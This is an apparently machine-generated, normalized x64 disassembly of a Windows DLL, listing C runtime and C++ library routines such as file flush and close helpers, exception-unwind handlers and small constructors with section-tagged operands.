test rcx rcx
je r-xdata
or edi 0xffffffff
jmp r-xdata
call sub_18002094c
and [ rbx + 0x28 ] 0x0
sub_1800336ac
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x20
mov rbx rcx
or edi 0xffffffff
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
test [ rcx + 0x18 ] 0x40
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
call sub_18002f19c
nop
mov rcx rbx
call sub_180033630
mov edi eax
mov rcx rbx
call sub_18002f234
jmp r-xdata
and [ rcx + 0x18 ] 0x0
jmp r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov eax edi
jmp r-xdata
sub_180033714
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x20
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180022de4
mov [ rax ] 0x9
jmp r-xdata
call sub_180022de4
mov [ rax ] 0x9
call sub_180026534
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rbx rdi
mov rsi rdi
sar rsi 0x5
lea r12 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_180030f5c
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_180022de4
mov [ rax ] 0x9
or ebx 0xffffffff
mov ecx edi
call sub_180030ee8
mov rcx rax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
xor ebx ebx
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_180031004
mov eax ebx
jmp r-xdata
call sub_180022e04
mov [ rax ] ebx
test ebx ebx
je r-xdata
sub_1800337ec
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r14
sub rsp 0x10
and [ r8 ] 0x0
and [ r8 + 0x4 ] 0x0
and [ r8 + 0x8 ] 0x0
mov r11 r8
mov edi edx
mov rbp rcx
mov ebx 0x404e
test edx edx
je r-xdata
cmp [ r11 + 0x8 ] 0x0
jne r-xdata
xor r9d r9d
xor r10d r10d
lea r14d [ r9 + 0x1 ]
mov r8d [ r11 + 0x8 ]
mov r10d 0x8000
test r10d r8d
jne r-xdata
mov r9d [ r11 + 0x4 ]
mov eax r14d
cmp edx ecx
jae r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov [ r11 + 0xa ] bx
mov rbx [ rsp + 0x30 ]
add rsp 0x10
pop r14
pop r12
pop rdi
retn
mov r9d [ r11 + 0x4 ]
mov edx [ r11 ]
mov eax r9d
mov r8d r9d
shl eax 0x10
mov ecx edx
shr r8d 0x10
shr ecx 0x10
shl edx 0x10
mov [ r11 + 0x8 ] r8d
mov r9d ecx
mov [ r11 ] edx
or r9d eax
mov eax 0xfff0
add bx ax
mov [ r11 + 0x4 ] r9d
test r8d r8d
je r-xdata
shr rsi 0x20
xor eax eax
lea r8d [ r9 + rsi ]
cmp r8d r9d
jb r-xdata
mov eax r9d
inc r9d
xor ecx ecx
cmp r9d eax
jb r-xdata
mov [ r11 ] edx
test eax eax
je r-xdata
mov eax [ r11 ]
mov edx r9d
add r8d r8d
mov ecx eax
add eax eax
shr edx 0x1f
shr ecx 0x1f
add r9d r9d
or r8d edx
or r9d ecx
mov [ r11 ] eax
mov eax 0xffff
add bx ax
mov [ r11 + 0x4 ] r9d
mov [ r11 + 0x8 ] r8d
test r10d r8d
je r-xdata
mov eax r14d
cmp r8d esi
jae r-xdata
mov ecx r14d
cmp r9d r14d
jae r-xdata
add r10d r12d
mov eax edx
add edx edx
shr eax 0x1f
mov ecx r8d
lea r9d [ r8 + r8 ]
shr ecx 0x1f
or r9d eax
add r10d r10d
or r10d ecx
mov [ r11 + 0x4 ] r9d
mov [ r11 ] edx
mov [ r11 + 0x8 ] r10d
movsx r8d [ rbp ]
xor ecx ecx
lea eax [ rdx + r8 ]
cmp eax edx
jb r-xdata
add r10d r14d
mov [ r11 + 0x8 ] r10d
mov [ r11 + 0x4 ] r8d
test eax eax
je r-xdata
inc r10d
mov [ r11 + 0x8 ] r10d
mov [ r11 + 0x4 ] r9d
test ecx ecx
je r-xdata
mov ecx r14d
cmp eax r8d
jae r-xdata
add rbp r14
dec edi
mov [ r11 + 0x4 ] r9d
mov [ r11 + 0x8 ] r10d
jne r-xdata
mov eax r9d
inc r9d
xor ecx ecx
cmp r9d eax
jb r-xdata
mov [ r11 ] eax
test ecx ecx
je r-xdata
mov rsi [ r11 ]
mov r12d [ r11 + 0x8 ]
mov edx r9d
add r9d r9d
add r10d r10d
shr edx 0x1f
or r10d edx
lea r8d [ rsi + rsi ]
mov ecx esi
shr ecx 0x1f
add r10d r10d
mov eax r8d
or r9d ecx
add r8d r8d
shr eax 0x1f
mov ecx r9d
add r9d r9d
mov [ rsp ] rsi
shr ecx 0x1f
or r9d eax
xor eax eax
or r10d ecx
mov ecx esi
mov [ r11 ] r8d
lea edx [ r8 + rcx ]
mov [ r11 + 0x4 ] r9d
mov [ r11 + 0x8 ] r10d
cmp edx r8d
jb r-xdata
mov ecx r14d
cmp r9d r14d
jae r-xdata
inc r10d
mov [ r11 + 0x8 ] r10d
mov [ r11 + 0x4 ] r9d
test ecx ecx
je r-xdata
sub_180033a08
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rdi ecx
mov ecx edi
call sub_180030ee8
cmp rax 0xffffffffffffffff
je r-xdata
xor ebx ebx
mov rax [ rw-data ]
mov ecx 0x2
cmp edi 0x1
jne r-xdata
xor eax eax
mov ecx ebx
call sub_180022e24
or eax 0xffffffff
jmp r-xdata
cmp edi ecx
jne r-xdata
test [ rax + 0xb8 ] dil
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx edi
call sub_180030ee8
mov rcx rax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ rax + 0x60 ] 0x1
je r-xdata
call sub_180030ee8
mov ecx 0x1
mov rbx rax
call sub_180030ee8
cmp rax rbx
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_180030e3c
mov r11 rdi
mov rcx rdi
sar rcx 0x5
and r11d 0x1f
lea rdx [ rw-data ]
mov rcx [ rdx + rcx * 8 ]
imul r11 r11 0x58
mov [ rcx + r11 + 0x8 ] 0x0
test ebx ebx
je r-xdata
sub_180033ac4
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x20
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180022e04
and [ rax ] 0x0
call sub_180022de4
mov [ rax ] 0x9
jmp r-xdata
call sub_180022e04
and [ rax ] 0x0
call sub_180022de4
mov [ rax ] 0x9
call sub_180026534
cmp ebx [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rdi rbx
mov rsi rbx
sar rsi 0x5
lea r12 [ rw-data ]
and edi 0x1f
imul rdi rdi 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rdi + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx ebx
call sub_180030f5c
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rdi + 0x8 ] 0x1
je r-xdata
call sub_180022de4
mov [ rax ] 0x9
or edi 0xffffffff
mov ecx ebx
call sub_180033a08
mov edi eax
jmp r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov ecx ebx
call sub_180031004
mov eax edi
jmp r-xdata
sub_180033b88
push rbx
sub rsp 0x20
test [ rcx + 0x18 ] 0x83
mov rbx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
test [ rcx + 0x18 ] 0x8
je r-xdata
mov rcx [ rcx + 0x10 ]
call sub_18002094c
and [ rbx + 0x18 ] 0xfffffbf7
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x8 ] eax
sub_180033c80
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x78 ]
mov [ rbp + 0x78 ] rdx
inc rdx
mov rcx [ rbp + 0x70 ]
add rcx 0x20
call sub_180001120
mov [ rbp + 0x88 ] rax
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_180033cc0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x70 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] 0x0
xor eax eax
mov [ rbx ] ax
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_180033d00
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x48 ]
test rbx rbx
je r-xdata
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
int3
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rcx rbx
call j_sub_18002094c#2
call sub_18002094c
sub_180033d90
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x20 ]
mov rdi [ rbp + 0x70 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
int3
mov rsi [ rbp + 0x78 ]
mov rdx rbx
mov rcx rsi
call sub_1800026e0
add rbx 0x28
cmp rbx rdi
jne r-xdata
sub_180033dd0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x50 ]
call sub_180002870
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
lea rcx [ rdx + 0x50 ]
jmp r-xdata
add rcx 0x8
jmp sub_180002870
sub_180033e40
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x48 ]
test rbx rbx
je r-xdata
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
int3
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov rcx rbx
call j_sub_18002094c#2
call sub_18002094c
sub_180033ea0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x48 ]
test rbx rbx
je r-xdata
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
int3
mov rcx [ rbx ]
call sub_18002094c
mov rcx rbx
call j_sub_18002094c#2
sub_180033f70
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x60 ]
mov rdi [ rbp + 0x70 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
int3
mov rsi [ rbp + 0x78 ]
mov rdx rbx
mov rcx rsi
call sub_1800026e0
add rbx 0x28
cmp rbx rdi
jne r-xdata
sub_180033fb0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x40 ]
mov rdi [ rbp + 0x50 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
int3
mov rsi [ rbp + 0x58 ]
mov rdx rbx
mov rcx rsi
call sub_180003d40
add rbx 0x10
cmp rbx rdi
jne r-xdata
sub_180034080
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x60 ]
mov rdi [ rbp + 0x70 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
int3
mov rsi [ rbp + 0x78 ]
mov rdx rbx
mov rcx rsi
call sub_1800026e0
add rbx 0x28
cmp rbx rdi
jne r-xdata
sub_1800340e0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x68 ]
call j_sub_18002094c#2
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
mov rcx [ rdx + 0x88 ]
jmp r-xdata
add rcx 0x8
jmp sub_180002870
sub_1800341e0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
int3
nop [ rax ] eax
lea rcx [ rbx + 0x8 ]
call sub_180002870
add rbx 0x28
cmp rbx rdi
jne r-xdata
sub_180034250
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x68 ]
call j_sub_18002094c#2
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
mov rcx [ rdx + 0x50 ]
jmp r-xdata
lea rax [ r--data ]
mov [ rcx ] rax
retn
sub_1800343c0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x78 ]
mov [ rbp + 0x78 ] rdx
inc rdx
mov rcx [ rbp + 0x70 ]
add rcx 0x20
call sub_1800073b0
mov [ rbp + 0x88 ] rax
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_180034400
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x70 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
int3
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_1800345e0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x30 ]
call j_sub_180002870
sub_180034a70
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x90 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x90 ] 0xfffffffe
lea rcx [ rbp + 0x28 ]
call sub_18000ca70
sub_180034ac0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x50 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
int3
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_180034b50
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0xa0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_180034c80
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x58 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x58 ] 0xfffffffe
mov rcx [ rbp + 0x50 ]
call sub_1800034f0
sub_180034de0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x40 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x40 ] 0xfffffffe
lea rcx [ rbp + 0xb0 ]
add rcx 0x98
call sub_18000b830
sub_180035060
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x38 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x38 ] 0xfffffffe
lea rcx [ rbp + 0x68 ]
call sub_180001820
sub_180035100
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x20 ]
call j_sub_18002094c#2
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
mov rcx [ rdx + 0x30 ]
add rcx 0x8
jmp sub_180020254
sub_180035450
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x60 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] 0x0
xor eax eax
mov [ rbx ] ax
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
mov rcx [ rdx + 0x28 ]
jmp j_sub_18002094c#2
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_180035510
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x28 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x28 ] 0xfffffffe
mov rcx [ rbp + 0x48 ]
call sub_1800034f0
sub_180035610
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x24 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x24 ] 0xfffffffe
mov rcx [ rbp + 0x30 ]
call sub_1800034f0
sub_1800357b0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x40 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x40 ] 0xfffffffe
mov rcx [ rbp + 0x58 ]
call sub_1800034f0
sub_180036180
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x58 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x58 ] 0xfffffffe
mov rcx [ rbp + 0x50 ]
call sub_180001820
sub_180036270
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov r8 [ rbp + 0x40 ]
mov rdx [ rbp + 0x48 ]
lea rcx [ rbp + 0xf0 ]
call sub_18001d0c0
nop
lea r8 [ rbp + 0x50 ]
mov rdx rax
mov rcx [ rbp + 0x28 ]
call sub_180008960
nop
cmp [ rbp + 0x108 ] 0x8
jb r-xdata
lea rax [ sub_18001da4b ]
add rsp 0x20
pop rbp
retn
mov rcx [ rbp + 0xf0 ]
call j_sub_18002094c#2
nop
sub_180036649
push rbp
sub rsp 0x40
mov rbp rdx
lea rax [ rbp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov rax [ rbp + 0x90 ]
mov [ rsp + 0x28 ] rax
mov rax [ rbp + 0x88 ]
mov [ rsp + 0x20 ] rax
mov r9 [ rbp + 0x80 ]
mov r8 [ rbp + 0x78 ]
mov rdx [ rbp + 0x70 ]
call sub_180020c14
nop
add rsp 0x40
pop rbp
retn
sub_1800367a5
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x68 ] rcx
mov [ rbp + 0x58 ] rcx
mov rax [ rbp + 0x58 ]
mov rcx [ rax ]
mov [ rbp + 0x28 ] rcx
mov [ rbp + 0x20 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov [ rbp + 0x30 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rdx [ rbp + 0x28 ]
mov rax [ rbp + 0xc8 ]
mov rcx [ rax + 0x28 ]
cmp [ rdx + 0x28 ] rcx
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov [ rbp + 0x20 ] 0x1
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
call sub_180025c90
mov [ rax + 0x2c0 ] 0x1
mov [ rbp + 0x20 ] 0x1
mov [ rbp + 0x30 ] 0x1
jmp r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
mov eax [ rbp + 0x30 ]
add rsp 0x20
pop rbp
retn
sub_1800368a5
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rcx [ rbp + 0x50 ]
call sub_180020eb0
cmp [ rbp + 0x20 ] 0x0
jne r-xdata
call sub_180025c90
mov rcx [ rbp + 0xd0 ]
mov [ rax + 0xf0 ] rcx
call sub_180025c90
mov rcx [ rbp + 0xd8 ]
mov [ rax + 0xf8 ] rcx
add rsp 0x28
pop rbp
pop rbx
retn
mov rbx [ rbp + 0xc8 ]
cmp [ rbx ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0x18 ] 0x4
jne r-xdata
cmp [ rbx + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rbx + 0x28 ]
call sub_180020e7c
test eax eax
je r-xdata
cmp [ rbx + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rbx
call sub_180024174
nop
cmp [ rbx + 0x20 ] 0x19930522
jne r-xdata
sub_1800375f4
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
xor edx edx
lea rcx [ rsp + 0x40 ]
call sub_18001f9f0
nop
jmp r-xdata
mov rbx [ rw-data ]
test rbx rbx
jne r-xdata
mov rax [ rbx ]
mov [ rw-data ] rax
mov rcx rbx
call sub_18001fa48
mov rcx rbx
call j_sub_18002094c#2
lea rcx [ rsp + 0x40 ]
call sub_18001fa20
add rsp 0x30
pop rbx
retn
sub_180037684
sub rsp 0x28
jmp r-xdata
mov rax [ rw-data ]
cmp rax 0xa
jb r-xdata
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
inc rax
mov [ rw-data ] rax
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
add rsp 0x28
retn
call rax
sub_180001000
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_180020498
sub_180001050
sub rsp 0x48
mov [ rsp + 0x20 ] 0xfffffffffffffffe
test rcx rcx
je r-xdata
xor eax eax
add rsp 0x48
retn
mov rax [ rcx ]
call [ rax + 0x8 ]
jmp r-xdata
sub_180001080
sub rsp 0x48
mov [ rsp + 0x20 ] 0xfffffffffffffffe
test rcx rcx
je r-xdata
xor eax eax
add rsp 0x48
retn
mov rax [ rcx ]
call [ rax ]
jmp r-xdata
sub_1800010b0
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rax rcx
retn
mov rax [ rcx ]
retn
sub_1800010c0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180020510
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_1800024c0
mov [ rsp + 0x10 ] rdx
sub rsp 0x28
lea rdx [ rsp + 0x38 ]
add rcx 0x10
call sub_180002230
add rsp 0x28
retn
j_sub_180002870
jmp sub_180002870
sub_180003080
movzx eax [ rcx + 0x8 ]
retn
sub_180003090
mov [ rcx + 0x8 ] dx
retn
sub_1800030a0
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_18002094c#2
sub_1800030d0
sub rsp 0x48
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax [ rcx ]
call [ rax + 0x28 ]
nop
xor eax eax
jmp r-xdata
add rsp 0x48
retn
sub_1800030f0
mov eax [ rcx + 0xa8 ]
retn
sub_180003100
mov eax [ rcx + 0xac ]
retn
sub_180003110
mov rcx [ rcx + 0x20 ]
mov rax [ rcx ]
jmp [ rax + 0x8 ]
sub_180003130
push rbx
sub rsp 0x20
mov rbx [ rcx + 0x10 ]
test rbx rbx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx [ rbx ]
call sub_18002094c
mov rcx rbx
call j_sub_18002094c#2
sub_180003310
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_18002094c#2
sub_180007880
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
call j_sub_18002094c#2
mov [ rbx ] 0x0
add rsp 0x20
pop rbx
retn
sub_1800090f0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180007700
test rax rax
jne r-xdata
add rsp 0x20
pop rbx
retn
mov rcx rbx
call sub_180008a20
sub_18000b6a0
push rbx
sub rsp 0x20
xor eax eax
mov rbx rcx
mov [ rcx ] rax
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x10 ] rax
call sub_18000b1b0
mov rax rbx
add rsp 0x20
pop rbx
retn
j_sub_180020498#2
jmp sub_180020498
sub_18000b6e0
lea rax [ r--data ]
mov [ rcx ] rax
retn
sub_18000b760
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_18002094c#2
sub_18000b830
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_1800200a0
sub_18000b840
mov rax [ rcx - 0x10 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x10 ] rax
retn
sub_18000b8a0
sub rsp 0x28
mov rdx [ rcx ]
mov rax [ rdx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdx + 0x48 ]
test rcx rcx
je r-xdata
add rsp 0x28
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
sub_18000b8d0
movzx eax dl
lea rdx [ rcx + 0x10 ]
mov ecx eax
jmp sub_18001f7a8
sub_18000b930
movzx eax dl
lea rdx [ rcx + 0x10 ]
mov ecx eax
jmp sub_1800200ec
sub_18000b990
movzx eax dl
retn
sub_18000b9a0
push rbx
sub rsp 0x20
mov rbx r8
mov rcx r9
sub r8 rdx
call sub_1800205e0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000b9c0
push rbx
sub rsp 0x20
mov rcx [ rsp + 0x50 ]
mov rbx r8
sub r8 rdx
call sub_1800205e0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000bb90
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180020510
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000bda0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
mov [ rbx ] 0x0
add rsp 0x20
pop rbx
retn
call sub_18002094c
sub_18000be20
add rcx 0x8
jmp sub_180020274
sub_18000be30
add rcx 0x8
jmp sub_18002027c
sub_18000be40
or eax 0xffffffff
retn
sub_18000be50
mov rax rcx
retn
sub_18000be60
xor eax eax
retn
sub_18000be70
retn 0x0
sub_18000be80
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
xor eax eax
cdqe
retn
mov rax [ rcx + 0x58 ]
movsxd rax [ rax ]
retn
sub_18000bea0
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
xor eax eax
cdqe
retn
mov rax [ rcx + 0x60 ]
movsxd rax [ rax ]
retn
sub_18000c080
mov rax [ r--data ]
mov [ rdx ] rax
xor eax eax
mov [ rdx + 0x8 ] rax
mov [ rdx + 0x10 ] eax
mov rax rdx
retn
sub_18000c860
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x10 ]
call j_sub_18002094c
mov rcx [ rbx + 0x20 ]
call j_sub_18002094c
mov rcx [ rbx + 0x28 ]
add rsp 0x20
pop rbx
jmp j_sub_18002094c
sub_18000d020
push rbx
sub rsp 0x20
mov rax [ rcx ]
mov rbx rdx
mov [ rsp + 0x30 ] 0x0
call [ rax + 0x20 ]
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000d040
push rbx
sub rsp 0x20
mov rax [ rcx ]
mov rbx rdx
mov [ rsp + 0x30 ] 0x0
call [ rax + 0x28 ]
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000d410
push rbx
sub rsp 0x20
mov rax [ rcx ]
mov rbx rdx
mov [ rsp + 0x30 ] 0x0
call [ rax + 0x18 ]
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000d640
movzx eax [ rcx + 0x18 ]
retn
sub_18000d650
movzx eax [ rcx + 0x19 ]
retn
sub_18000d6c0
push rbx
sub rsp 0x20
lea rbx [ rcx + 0x98 ]
mov rcx rbx
call sub_18000cbe0
lea r11 [ r--data ]
